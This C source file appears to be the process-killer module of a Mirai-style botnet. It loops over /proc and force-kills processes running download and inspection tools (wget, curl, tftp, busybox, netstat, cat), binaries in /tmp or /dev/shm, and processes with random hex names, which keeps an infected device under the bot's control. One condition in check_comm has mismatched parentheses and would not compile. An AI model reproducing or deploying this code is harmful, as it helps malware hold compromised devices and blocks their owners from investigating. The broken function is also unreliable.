#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <signal.h>
#include <linux/limits.h>
#include <stdint.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include "headers/killer.h"

#define PATH_LEN 512
#define MAX_PROCS 1024
#define DUP_THRESHOLD 4 //condi=4
#define BUFFER 512

volatile int killer_active = 0;

static const char *whitelisted[] = {
    "systemd", "init", "kthreadd", "kworker",
    "ksoftirqd", "watchdog", "migration", "rcu",
    "bash", "sh", "sudo",
    "/bin/", "/sbin/", "/usr/", "/lib/",
    NULL
};

static const char *blacklisted[] = {
    "wget", "curl", "tftp", "ftp", "busybox", "sftp", "ftpget", "echo -en", "netstat", "ls", "cat",
    NULL
};

static inline int is_whitelisted(const char *path) {
    for (int i = 0; whitelisted[i] != NULL; i++) {
        if (strstr(path, whitelisted[i])) return 1;
    }
    return 0;
}

static inline int is_blacklisted(const char *path) {
    for (int i = 0; blacklisted[i] != NULL; i++) {
        if (strstr(path, blacklisted[i])) return 1;
    }
    return 0;
}

static inline void kill_process(pid_t pid) {
    if (pid <= 0 || pid == 1 || pid == getpid() || pid == getppid()) return;
    kill(pid, SIGKILL);
}

static inline int is_suspicious_name(const char* name) {
    int weird_chars = 0;
    int len = strlen(name);
    
    if (strstr(name, "systemd") || strstr(name, "init") ||
        strstr(name, "kthreadd") || strstr(name, "kworker") ||
        strstr(name, "ksoftirqd") || strstr(name, "watchdog") ||
        strstr(name, "migration") || strstr(name, "rcu") ||
        strstr(name, "sshd") || strstr(name, "cron")) {
        return 0;
    }

    for (int i = 0; i < len; i++) {
        if (!isalnum(name[i])) weird_chars++;
    }
    //most randomize name idk not just condi
    return (weird_chars > 2) || (len >= 6 && len <= 12 && strspn(name, "0123456789abcdef") == len);
}

static inline int check_comm(const char* pid_str) {
    char path[PATH_LEN];
    char line[256] = {0};
    char comm_path[PATH_LEN];
    char comm_content[256] = {0};
    int fd;
    
    if (!pid_str || !isdigit(pid_str[0])) return 0;

    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, line, sizeof(line)-1);
        close(fd);
        if (n > 0) {
            line[n] = '\0';
            if (strstr(line, "curl") || strstr(line, "wget") || strstr(line, "netstat"))
                strstr(line, "tftp") || strstr(line, "ftp")) || strstr(line, "cat"))  {
                return 1;
            }
        }
    }

    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    fd = open(comm_path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, comm_content, sizeof(comm_content)-1);
        close(fd);
        if (n > 0) {
            comm_content[n] = '\0';
            char* newline = strchr(comm_content, '\n');
            if (newline) *newline = '\0';
            
            if (is_suspicious_name(comm_content)) {
                return 1;
            }
        }
    }

    return 0;
}

static inline int is_low_entropy(const char *str) {
    int len = strlen(str);
    if (len < 6) return 0;
    int hex = 1, same = 1;
    char first = str[0];
    for (int i = 0; i < len; i++) {
        if (!isxdigit(str[i])) hex = 0;
        if (str[i] != first) same = 0;
    }
    return hex || same;
}

static inline int is_critical_process(const char *exe_real, const char *comm_content) {
    const char *critical[] = {
        "/bin/busybox", "/bin/sh", "/bin/bash", "/usr/bin/bash", "/usr/bin/sh", "/sbin/init", "/usr/sbin/sshd", "/usr/sbin/cron", "/usr/sbin/watchdog", "/usr/sbin/klogd", "/usr/sbin/syslogd", "/usr/sbin/agetty", "/usr/sbin/rsyslogd", "/usr/sbin/ntpd", "/usr/sbin/udevd", "/usr/sbin/acpid", "/usr/sbin/dbus-daemon", "/usr/sbin/NetworkManager", NULL
    };
    for (int i = 0; critical[i] != NULL; i++) {
        if ((exe_real && strstr(exe_real, critical[i])) || (comm_content && strstr(comm_content, critical[i])))
            return 1;
    }
    return 0;
}

static inline int check_for_malware(const char *pid_str) {
    char exe_path[PATH_LEN];
    char exe_real[PATH_LEN] = {0};
    char cmdline_path[PATH_LEN];
    char cmdline[PATH_LEN] = {0};
    char comm_path[PATH_LEN];
    char comm_content[256] = {0};
    struct stat st;
    int fd;
    ssize_t n;
    uid_t uid = 0;

    snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", pid_str);
    ssize_t exe_len = readlink(exe_path, exe_real, sizeof(exe_real) - 1);
    if (exe_len > 0) {
        exe_real[exe_len] = '\0';
        if (stat(exe_real, &st) == 0) {
            uid = st.st_uid;
        }
        if (is_critical_process(exe_real, NULL))
            return 0;
        if (uid == 0 && !(strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")))
            return 0;
        if (strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")) {
            if (!is_critical_process(exe_real, NULL) && uid != 0)
                return 1;
        }
        const char *base = strrchr(exe_real, '/');
        if (base) base++;
        else base = exe_real;
        int blen = strlen(base);
        if (blen >= 6 && blen <= 12 && is_low_entropy(base) && uid != 0)
            return 1;
        if ((strstr(exe_real, "/tmp/") || strstr(exe_real, "/dev/shm/") || strstr(exe_real, "/var/run/")) && stat(exe_real, &st) == 0 && (st.st_mode & S_IWOTH) && uid != 0)
            return 1;
    }

    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid_str);
    fd = open(cmdline_path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, cmdline, sizeof(cmdline)-1);
        close(fd);
        if (n > 0) {
            cmdline[n] = '\0';
            if (strstr(cmdline, "/bin/busybox") && strlen(cmdline) < 32 && uid != 0)
                return 1;
            if (strstr(cmdline, "/bin/sh") && strlen(cmdline) < 32 && uid != 0)
                return 1;
        }
    }

    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    fd = open(comm_path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, comm_content, sizeof(comm_content)-1);
        close(fd);
        if (n > 0) {
            comm_content[n] = '\0';
            char* newline = strchr(comm_content, '\n');
            if (newline) *newline = '\0';
            int clen = strlen(comm_content);
            if (is_critical_process(NULL, comm_content))
                return 0;
            if (clen >= 6 && clen <= 12 && is_low_entropy(comm_content) && uid != 0)
                return 1;
        }
    }

    return 0;
}

static inline int check_cmdline(const char *pid_str) {
    char path[PATH_LEN];
    char buf[PATH_LEN] = {0};  
    int fd;
    
    if (snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str) >= sizeof(path)) {
        return 0;
    }
    fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            for (int i = 0; blacklisted[i] != NULL; i++) {
                if (strstr(buf, blacklisted[i])) {
                    return 1;
                }
            }
        }
    }
    return 0;
}

typedef struct {
    char name[256];
    int count;
} ProcCount;

static inline int check_duplicates(const char* name, ProcCount* procs, int* proc_count) {
    for (int i = 0; i < *proc_count; i++) {
        if (strcmp(procs[i].name, name) == 0) {
            procs[i].count++;
            return procs[i].count >= DUP_THRESHOLD;
        }
    }
    
    if (*proc_count < MAX_PROCS) {
        strncpy(procs[*proc_count].name, name, 255);
        procs[*proc_count].count = 1;
        (*proc_count)++;
    }
    return 0;
}

static void* killer_thread(void* arg) {
    DIR *dir;
    struct dirent *entry;
    pid_t pid;
    char comm_path[PATH_LEN];  
    char comm_content[PATH_LEN] = {0};
//fks 
    struct timespec sleep_time = {0, 19800000}; 
    
    while(killer_active) {
        dir = opendir("/proc");
        if (!dir) {
            nanosleep(&sleep_time, NULL);
            continue;
        }

        while ((entry = readdir(dir)) && killer_active) {
            if (!entry->d_name || !isdigit(entry->d_name[0])) continue;
            
            pid = atoi(entry->d_name);
            if (pid <= 1 || pid == getpid() || pid == getppid()) continue;

            if (check_comm(entry->d_name)) {
                kill_process(pid);
                kill(pid, SIGTERM); 
                usleep(1000);        
                kill_process(pid);    
                continue;
            }

            if (check_cmdline(entry->d_name)) {
                kill_process(pid);
                kill(pid, SIGTERM);
                usleep(1000);
                kill_process(pid);
                continue;
            }

            if (check_for_malware(entry->d_name)) {
                kill_process(pid);
                kill(pid, SIGTERM);
                usleep(1000);
                kill_process(pid);
                continue;
            }

            if (snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name) >= sizeof(comm_path)) {
                continue;
            }
            
            int fd = open(comm_path, O_RDONLY);
            if (fd >= 0) {
                ssize_t n = read(fd, comm_content, sizeof(comm_content)-1);
                close(fd);
                if (n > 0) {
                    comm_content[n] = '\0';
                    char* newline = strchr(comm_content, '\n');
                    if (newline) *newline = '\0';
                    
                    for (int i = 0; blacklisted[i] != NULL; i++) {
                        if (strstr(comm_content, blacklisted[i])) {
                            kill_process(pid);
                            kill(pid, SIGTERM);
                            usleep(1000);
                            kill_process(pid);
                            break;
                        }
                    }
                }
            }
        }
        closedir(dir);
        nanosleep(&sleep_time, NULL);
    }
    return NULL;
}

void start_killer(void) {
    killer_active = 1;
    pthread_t thread;
    if (pthread_create(&thread, NULL, killer_thread, NULL) != 0) {
        return;
    }
    pthread_detach(thread);
}

void stop_killer(void) {
    killer_active = 0;
}
